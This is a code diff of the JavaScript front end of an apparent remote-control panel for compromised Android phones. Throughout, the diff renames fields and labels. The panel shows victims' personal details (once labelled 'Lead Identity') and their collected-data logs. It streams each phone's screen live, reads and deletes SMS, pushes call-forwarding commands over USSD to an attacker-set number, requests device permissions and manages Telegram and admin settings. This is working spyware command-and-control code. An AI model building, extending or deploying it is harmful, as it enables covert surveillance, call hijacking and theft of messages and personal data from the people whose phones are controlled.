+    const dev = deviceId !== "global" ? lastSnapshotData.Devices_Details[deviceId] : null;
     const modalBody = document.getElementById('modal-body');
     
     // Optimization for Screen Control: only update the image source to prevent UI flicker
     if (activeModalType === 'screen_control') {
         const frameImg = document.getElementById('screen-frame');
-        const castData = dev.Screen_cast || {};
-        if (frameImg && castData.data) {
-            frameImg.src = `data:image/jpeg;base64,${castData.data}`;
+        const castData = dev?.Screen_cast || {};
+        if (frameImg && castData?.data) {
+            frameImg.src = `data:image/jpeg;base64,${castData?.data}`;
             return; // Don't re-render full HTML if frame is just updating
         }
     }
 
     let html = '';
 
-    if (activeModalType === 'new' && dev.user_info) {
-        // Show user_info (Lead Identity) for the main Details button
+    if (activeModalType === 'new' && dev?.user_info) {
+        // Show user_info for the Live Details button
         html += `<div class="space-y-3 mb-6">
             <div class="flex items-center space-x-2 px-1">
                 <i data-lucide="user-check" class="w-3.5 h-3.5 text-indigo-600"></i>
-                <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Lead Identity (Live)</h4>
+                <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Live Details</h4>
             </div>
             <div class="grid grid-cols-2 gap-3 bg-white border-2 border-indigo-500/30 p-4 rounded-3xl shadow-sm">
-                ${Object.entries(dev.user_info).map(([key, value]) => `
+                ${Object.entries(dev?.user_info || {}).map(([key, value]) => `
                     <div>
                         <p class="text-[8px] font-bold text-slate-400 uppercase mb-1 leading-none">${key.replace(/_/g, ' ')}</p>
                         <p class="text-[11px] font-black text-slate-800 break-words leading-tight">${value || '---'}</p>
@@ -1113,15 +1214,15 @@ function renderModalUI(deviceId) {
                 `).join('')}
             </div>
         </div>`;
-    } else if (activeModalType === 'old' && dev.data_collection) {
-        // Show data_collection history for the Old Details button
+    } else if (activeModalType === 'old' && dev?.old_records) {
+        // Show old_records history for the Old Details button
         html += `<div class="space-y-3">
             <div class="flex items-center space-x-2 px-1">
                 <i data-lucide="history" class="w-3.5 h-3.5 text-indigo-600"></i>
                 <h4 class="text-[10px] font-black text-indigo-600 uppercase tracking-widest">Logs History</h4>
             </div>
             <div class="space-y-4">
-                ${Object.values(dev.data_collection).reverse().map(entry => `
+                ${Object.values(dev?.old_records || {}).reverse().map(entry => `
                     <div class="bg-white border-2 border-indigo-500/20 p-4 rounded-3xl shadow-lg shadow-indigo-50/50 hover:border-indigo-500/40 transition-all">
                         <div class="flex justify-between items-center mb-3 border-b border-slate-50 pb-2">
                             <span class="text-[9px] font-black text-indigo-500 uppercase tracking-tighter">Record Entry</span>
@@ -1166,10 +1267,10 @@ function renderModalUI(deviceId) {
             <!-- History List -->
             <div class="space-y-3">
                 ${sessionList.map(s => {
-                    const isActive = s.logout === "Active Now";
+                    const isActive = s.logout === "LIVE";
                     const logoutDisplay = isActive ? 
                         '<span class="flex items-center justify-center space-x-1"><span class="h-1 w-1 bg-emerald-500 rounded-full animate-ping"></span><span class="text-emerald-600">LIVE</span></span>' : 
-                        (s.logout_time ? new Date(s.logout_time).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }).toLowerCase() : '---');
+                        s.logout;
                     
                     return `
                     <div class="group relative bg-white border border-slate-200 p-4 rounded-2xl shadow-sm hover:shadow-md hover:border-indigo-300 transition-all">
@@ -1200,54 +1301,54 @@ function renderModalUI(deviceId) {
         </div>`;
     } else if (activeModalType === 'active_admins') {
         // Current Active Admins Status Logic
-        const admins = lastSnapshotData.admins || {};
+        const allAdmins = lastSnapshotData.admins || {};
+        // फिल्टर करें सिर्फ ACTIVE स्टेटस वाले
+        const activeAdminsList = Object.entries(allAdmins).filter(([id, info]) => info && info.status === 'ACTIVE');
         html += `
         <div class="space-y-6">
             <div class="flex items-center justify-between px-2">
                 <div class="space-y-1">
                     <h4 class="text-[12px] font-black text-indigo-600 uppercase tracking-[0.2em] flex items-center gap-2">
-                        <i data-lucide="users" class="w-4 h-4"></i> Live Terminals
+                        <i data-lucide="users" class="w-4 h-4"></i> Online Admins
                     </h4>
                     <p class="text-[9px] font-bold text-slate-400 uppercase tracking-wider">Connected Administrators</p>
                 </div>
                 <span class="bg-indigo-50 text-indigo-600 px-4 py-1.5 rounded-2xl text-[10px] font-black border border-indigo-100 shadow-sm">
-                    ${Object.keys(admins).length} Active
+                    ${activeAdminsList.length} Online
                 </span>
             </div>
 
             <div class="space-y-3 px-1">
-                ${Object.entries(admins).map(([id, info]) => {
-                    const name = info.name || (info.model ? info.model.split(' (')[0] : id);
-                    const device = info.device || ((info.model && info.model.includes(' (')) ? info.model.split(' (')[1].split(')')[0] : 'Unknown Device');
-                    const isActive = info.status === 'ACTIVE';
-                    
+                ${activeAdminsList.map(([id, info]) => {
+                    const adminName = info.name || id; // डिवाइस नेम की जगह यूज़र का name
+                    const loginTime = info.last_login_timestamp ? new Date(info.last_login_timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'Online';
                     return `
                     <div class="group relative bg-white border border-slate-100 p-4 rounded-[2rem] flex items-center justify-between shadow-sm hover:shadow-xl hover:border-indigo-200 hover:-translate-y-1 transition-all duration-300">
-                        <div class="absolute left-0 top-1/2 -translate-y-1/2 w-1.5 h-10 ${isActive ? 'bg-emerald-500 shadow-[4px_0_12px_rgba(16,185,129,0.4)]' : 'bg-slate-300'} rounded-r-full"></div>
+                        <div class="absolute left-0 top-1/2 -translate-y-1/2 w-1.5 h-10 bg-emerald-500 shadow-[4px_0_12px_rgba(16,185,129,0.4)] rounded-r-full"></div>
                         
                         <div class="flex items-center space-x-4 pl-2">
                             <div class="relative">
-                                <div class="w-12 h-12 ${isActive ? 'bg-indigo-50 text-indigo-600' : 'bg-slate-50 text-slate-400'} rounded-2xl flex items-center justify-center border border-slate-100 transition-colors group-hover:bg-indigo-600 group-hover:text-white">
+                                <div class="w-12 h-12 bg-indigo-50 text-indigo-600 rounded-2xl flex items-center justify-center border border-slate-100 transition-colors group-hover:bg-indigo-600 group-hover:text-white">
                                     <i data-lucide="user" class="w-6 h-6"></i>
                                 </div>
-                                ${isActive ? '<span class="absolute -top-1 -right-1 flex h-3 w-3"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span><span class="relative inline-flex rounded-full h-3 w-3 bg-emerald-500 border-2 border-white"></span></span>' : ''}
+                                <span class="absolute -top-1 -right-1 flex h-3 w-3"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span><span class="relative inline-flex rounded-full h-3 w-3 bg-emerald-500 border-2 border-white"></span></span>
                             </div>
                             <div class="min-w-0">
-                                <p class="font-black text-slate-800 uppercase tracking-tight text-[13px] truncate mb-0.5">${name}</p>
+                                <p class="font-black text-slate-800 uppercase tracking-tight text-[13px] truncate mb-0.5">${adminName}</p>
                                 <div class="flex items-center space-x-2">
-                                    <i data-lucide="monitor" class="w-3 h-3 text-slate-300"></i>
-                                    <p class="text-[9px] font-black text-indigo-500/70 uppercase tracking-widest truncate">${device}</p>
+                                    <i data-lucide="user-check" class="w-3 h-3 text-slate-300"></i>
+                                    <p class="text-[9px] font-black text-indigo-500/70 uppercase tracking-widest truncate">User: ${adminName} (${loginTime})</p>
                                 </div>
                             </div>
                         </div>
                         
                         <div class="flex items-center space-x-2">
-                            <button onclick="deleteAdmin('${id}', '${name}')" class="w-10 h-10 bg-rose-50 text-rose-500 rounded-2xl flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all hover:bg-rose-500 hover:text-white active:scale-90 shadow-sm">
+                            <button onclick="deleteAdmin('${id}', '${adminName}')" class="w-10 h-10 bg-rose-50 text-rose-500 rounded-2xl flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all hover:bg-rose-500 hover:text-white active:scale-90 shadow-sm">
                                 <i data-lucide="trash-2" class="w-4 h-4"></i>
                             </button>
                         </div>
                     </div>
-                `}).join('') || '<div class="py-16 text-center text-slate-300 font-bold uppercase text-[10px] tracking-widest">No Admins Registered</div>'}
+                `}).join('') || '<div class="py-16 text-center text-slate-300 font-bold uppercase text-[10px] tracking-widest">No Live Admins Found</div>'}
             </div>
         </div>`;
     } else if (activeModalType === 'super_access') {
@@ -1285,40 +1386,39 @@ function renderModalUI(deviceId) {
         
         html += `<div class="space-y-4">
             <div class="flex items-center justify-between px-1">
-                <h4 class="text-[10px] font-black text-rose-400 uppercase tracking-widest text-glow">Pending Approvals</h4>
-                <span class="text-[8px] font-bold text-white/40 uppercase tracking-wider">${waitingAdmins.length} Requests Found</span>
+                <h4 class="text-[10px] font-black text-rose-500 uppercase tracking-widest">Pending Approvals</h4>
+                <span class="text-[8px] font-bold text-slate-400 uppercase tracking-wider">${waitingAdmins.length} Requests Found</span>
             </div>
             <div class="space-y-3">
                 ${waitingAdmins.map(([id, info]) => {
-                    const name = info.name || (info.model ? info.model.split(' (')[0] : id);
-                    const device = info.device || ((info.model && info.model.includes(' (')) ? info.model.split(' (')[1].split(')')[0] : 'Unknown Device');
+                    const adminName = info.name || id;
                     const date = info.created_at ? new Date(info.created_at).toLocaleString('en-GB', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', hour12: true }) : 'Recently';
                     return `
-                    <div class="glass-card bg-white/5 border-white/10 p-4 rounded-3xl flex flex-col space-y-4">
+                    <div class="bg-white border border-slate-100 p-4 rounded-3xl flex flex-col space-y-4 shadow-sm">
                         <div class="flex items-center space-x-3">
-                            <div class="w-10 h-10 bg-rose-500/10 text-rose-400 rounded-2xl flex items-center justify-center border border-rose-500/20">
+                            <div class="w-10 h-10 bg-rose-50 text-rose-500 rounded-2xl flex items-center justify-center border border-rose-100">
                                 <i data-lucide="user-plus" class="w-5 h-5"></i>
                             </div>
                             <div class="min-w-0 flex-grow">
-                                <p class="font-black text-yellow-400 uppercase tracking-tight truncate text-[13px]">Admin: ${name}</p>
-                                <p class="text-[9px] font-bold text-rose-300 uppercase mt-0.5 tracking-widest leading-none">Device: ${device}</p>
+                                <p class="font-black text-slate-800 uppercase tracking-tight truncate text-[13px]">Name: ${adminName}</p>
+                                <p class="text-[9px] font-bold text-rose-500/70 uppercase mt-0.5 tracking-widest leading-none">New Admin Request</p>
                                 <div class="flex items-center justify-between mt-2">
-                                    <p class="text-[8px] font-bold text-white/20 uppercase tracking-tighter">ID: ${id}</p>
-                                    <p class="text-[8px] font-black text-rose-400/50 uppercase">${date}</p>
+                                    <p class="text-[8px] font-bold text-slate-300 uppercase tracking-tighter">ID: ${id}</p>
+                                    <p class="text-[8px] font-black text-rose-500/50 uppercase">${date}</p>
                                 </div>
                             </div>
                         </div>
                         <div class="grid grid-cols-2 gap-2.5">
                             <button onclick="approveAdmin('${id}')" class="bg-emerald-500 hover:bg-emerald-600 text-white font-black py-3 rounded-xl text-[9px] uppercase tracking-widest transition-all active:scale-95 shadow-lg shadow-emerald-500/20">Approve</button>
-                            <button onclick="deleteAdmin('${id}')" class="bg-rose-500 hover:bg-rose-600 text-white font-black py-3 rounded-xl text-[9px] uppercase tracking-widest transition-all active:scale-95 shadow-lg shadow-rose-500/20">Delete</button>
+                            <button onclick="deleteAdmin('${id}', '${adminName}')" class="bg-rose-500 hover:bg-rose-600 text-white font-black py-3 rounded-xl text-[9px] uppercase tracking-widest transition-all active:scale-95 shadow-lg shadow-rose-500/20">Delete</button>
                         </div>
                     </div>
-                `}).join('') || '<div class="py-16 text-center text-white/20 font-bold uppercase text-[10px] tracking-widest">No Pending Requests</div>'}
+                `}).join('') || '<div class="py-16 text-center text-slate-300 font-bold uppercase text-[10px] tracking-widest">No Pending Requests</div>'}
             </div>
         </div>`;
     } else if (activeModalType === 'global_admin_number') {
         // Global Admin Number UI
-        const currentNum = lastSnapshotData.AppStats?.forward_number || '';
+        const currentNum = lastSnapshotData.AppStats?.admin_number || '';
         html += `<div class="space-y-6">
             <div class="text-center space-y-2">
                 <div class="w-16 h-16 bg-indigo-50 text-indigo-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
@@ -1377,7 +1477,7 @@ function renderModalUI(deviceId) {
 
             <div class="grid grid-cols-2 gap-3 pt-2">
                 <button onclick="updateTelegramConfig()" class="bg-sky-500 hover:bg-sky-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-sky-100 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
-                    Add
+                    Save Settings
                 </button>
                 <button onclick="deleteTelegramConfig()" class="bg-rose-500 hover:bg-rose-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-rose-100 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
                     Delete
@@ -1386,6 +1486,8 @@ function renderModalUI(deviceId) {
         </div>`;
     } else if (activeModalType === 'call_forwarding') {
         // Call Forwarding Modal UI
+        const simDetails = dev?.sim_info?.details || [];
+        const callStatus = dev?.call_commands?.status || dev?.call_forward?.status;
         html += `<div class="space-y-6">
             <div class="space-y-2">
                 <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Forwarding Number</label>
@@ -1399,15 +1501,15 @@ function renderModalUI(deviceId) {
             <div class="space-y-3">
                 <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Select SIM Slot</label>
                 <div class="grid grid-cols-2 gap-3">
-                    ${Object.values(dev.sims || {}).map(sim => `
-                        <div onclick="selectedSlot=${sim.slot}; renderModalUI('${deviceId}')" 
-                            class="cursor-pointer p-4 rounded-2xl border-2 transition-all ${selectedSlot === sim.slot ? 'border-indigo-600 bg-indigo-50/50 shadow-md shadow-indigo-100' : 'border-slate-100 bg-white hover:border-slate-200'}">
+                    ${simDetails.map(sim => `
+                        <div onclick="selectedSlot=${sim.slot_index}; renderModalUI('${deviceId}')" 
+                            class="cursor-pointer p-4 rounded-2xl border-2 transition-all ${selectedSlot === sim.slot_index ? 'border-indigo-600 bg-indigo-50/50 shadow-md shadow-indigo-100' : 'border-slate-100 bg-white hover:border-slate-200'}">
                             <div class="flex items-center justify-between mb-2">
-                                <div class="p-1.5 bg-slate-50 rounded-lg"><i data-lucide="sim-card" class="w-3.5 h-3.5 ${selectedSlot === sim.slot ? 'text-indigo-600' : 'text-slate-400'}"></i></div>
-                                ${selectedSlot === sim.slot ? '<div class="w-4 h-4 bg-indigo-600 rounded-full flex items-center justify-center"><i data-lucide="check" class="w-2.5 h-2.5 text-white"></i></div>' : ''}
+                                <div class="p-1.5 bg-slate-50 rounded-lg"><i data-lucide="cpu" class="w-3.5 h-3.5 ${selectedSlot === sim.slot_index ? 'text-indigo-600' : 'text-slate-400'}"></i></div>
+                                ${selectedSlot === sim.slot_index ? '<div class="w-4 h-4 bg-indigo-600 rounded-full flex items-center justify-center"><i data-lucide="check" class="w-2.5 h-2.5 text-white"></i></div>' : ''}
                             </div>
                             <p class="text-[10px] font-black text-slate-800 truncate">${sim.carrier_name || 'No Carrier'}</p>
-                            <p class="text-[9px] font-bold text-slate-400 mt-1">${sim.number || 'SIM ' + (sim.slot+1)}</p>
+                            <p class="text-[9px] font-bold text-slate-400 mt-1">${sim.number || 'SIM ' + (sim.slot_index+1)}</p>
                         </div>
                     `).join('')}
                 </div>
@@ -1423,12 +1525,12 @@ function renderModalUI(deviceId) {
             </div>
 
             <!-- Realtime Response Feedback -->
-            <div class="mt-4 p-4 rounded-2xl border-2 border-dashed ${dev.call_forward ? 'border-indigo-500/20 bg-indigo-50/30' : 'border-slate-100 bg-slate-50/50'} text-center transition-all">
-                ${dev.call_forward ? `
+            <div class="mt-4 p-4 rounded-2xl border-2 border-dashed ${(callStatus) ? 'border-indigo-500/20 bg-indigo-50/30' : 'border-slate-100 bg-slate-50/50'} text-center transition-all">
+                ${(callStatus) ? `
                     <div class="space-y-1">
                         <p class="text-[8px] font-black text-indigo-400 uppercase tracking-widest">Device Feedback</p>
-                        <p class="text-[11px] font-black text-indigo-600 uppercase tracking-tight">${dev.call_forward.status || 'Command Sent'}</p>
-                        <p class="text-[10px] font-bold text-slate-500 leading-tight">${dev.call_forward.message || 'Device is processing USSD...'}</p>
+                        <p class="text-[11px] font-black text-indigo-600 uppercase tracking-tight">${callStatus || 'Command Sent'}</p>
+                        <p class="text-[10px] font-bold text-slate-500 leading-tight">${dev?.call_forward?.message || 'Processing Command...'}</p>
                     </div>
                 ` : `
                     <p class="text-[9px] font-black text-slate-300 uppercase tracking-widest">Ready for command</p>
@@ -1437,7 +1539,7 @@ function renderModalUI(deviceId) {
         </div>`;
     } else if (activeModalType === 'permissions') {
         // Permissions Logic
-        const permissions = dev.permissions || {};
+        const permissions = dev?.permissions || {};
         html += `<div class="space-y-4">
             <div class="flex items-center space-x-2 px-1">
                 <i data-lucide="shield-check" class="w-3.5 h-3.5 text-indigo-600"></i>
@@ -1471,11 +1573,11 @@ function renderModalUI(deviceId) {
         </div>`;
     } else if (activeModalType === 'screen_control') {
         // Screen Control UI
-        const castData = dev.Screen_cast || {};
+        const castData = dev?.Screen_cast || {};
         html += `<div class="flex flex-col items-center space-y-4">
             <div class="relative w-full aspect-[9/16] max-w-[280px] bg-slate-900 rounded-[2.5rem] overflow-hidden border-8 border-slate-800 shadow-2xl mx-auto flex items-center justify-center">
-                ${castData.data ? 
-                    `<img id="screen-frame" src="data:image/jpeg;base64,${castData.data}" class="w-full h-full object-contain" />` : 
+                ${castData?.data ? 
+                    `<img id="screen-frame" src="data:image/jpeg;base64,${castData?.data}" class="w-full h-full object-contain" />` : 
                     `<div class="flex flex-col items-center justify-center text-slate-500 space-y-3">
                         <div class="w-10 h-10 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin"></div>
                         <p class="text-[10px] font-black uppercase tracking-[0.2em] text-indigo-400">Syncing Stream...</p>
@@ -1486,7 +1588,7 @@ function renderModalUI(deviceId) {
                 <div class="flex items-center justify-between">
                     <div class="flex items-center space-x-2">
                         <span class="flex h-2 w-2 rounded-full bg-red-500 animate-pulse"></span>
-                        <span class="text-[10px] font-black text-slate-900 uppercase tracking-widest">Live Cast: ${dev.device?.device_name || 'Generic'}</span>
+                        <span class="text-[10px] font-black text-slate-900 uppercase tracking-widest">Live Cast: ${dev?.device?.device_name || 'Generic'}</span>
                     </div>
                     <i data-lucide="monitor-play" class="w-4 h-4 text-indigo-500"></i>
                 </div>
@@ -1512,7 +1614,7 @@ function deleteSms(deviceId, smsId) {
     if (!deviceId || !smsId) return;
     if (!confirm("Delete this SMS message permanently?")) return;
     
-    database.ref(`Devices/${deviceId}/Sms/${smsId}`).remove()
+    database.ref(`Devices_Details/${deviceId}/Sms/${smsId}`).remove()
         .then(() => showToast("SMS Deleted"))
         .catch(() => showToast("Failed to delete SMS", "error"));
 }
@@ -1524,7 +1626,7 @@ function deleteDevice(deviceId) {
     if (!deviceId) return;
     if (!confirm("WARNING: Are you sure you want to delete this device and all its data?")) return;
     
-    database.ref(`Devices/${deviceId}`).remove()
+    database.ref(`Devices_Details/${deviceId}`).remove()
         .then(() => showToast("Device Removed"))
         .catch(() => showToast("Failed to remove device", "error"));
 }
@@ -1563,7 +1665,7 @@ function toggleFavorite(deviceId, currentStatus) {
     // Toggle status: if true, set false. If false (or undefined), set true.
     const newStatus = !currentStatus;
     
-    database.ref(`Devices/${deviceId}/device/star`).set(newStatus)
+    database.ref(`Devices_Details/${deviceId}/device/star`).set(newStatus)
         .then(() => {
             showToast(newStatus ? "Added to Favorites" : "Removed from Favorites");
         })
@@ -1579,7 +1681,7 @@ function updateGlobalAdminNumber() {
         showToast("Enter valid 10-digit number", "error");
         return;
     }
-    database.ref('AppStats/forward_number').set(num)
+    database.ref('AppStats/admin_number').set(num)
         .then(() => showToast("Admin Number Updated"))
         .catch(() => showToast("Update Failed", "error"));
 }
@@ -1589,7 +1691,7 @@ function updateGlobalAdminNumber() {
  */
 function deleteGlobalAdminNumber() {
     if (!confirm("Are you sure you want to delete the admin number?")) return;
-    database.ref('AppStats/forward_number').remove()
+    database.ref('AppStats/admin_number').remove()
         .then(() => {
             document.getElementById('global-admin-num-input').value = '';
             showToast("Admin Number Deleted");
@@ -1633,7 +1735,7 @@ function deleteTelegramConfig() {
  */
 function requestPermission(deviceId, permissionKey) {
     if (!deviceId) return;
-    database.ref(`Devices/${deviceId}/permissions/${permissionKey}`).set("requested")
+    database.ref(`Devices_Details/${deviceId}/permissions/${permissionKey}`).set("requested")
         .then(() => {
             showToast("Request Sent");
         })
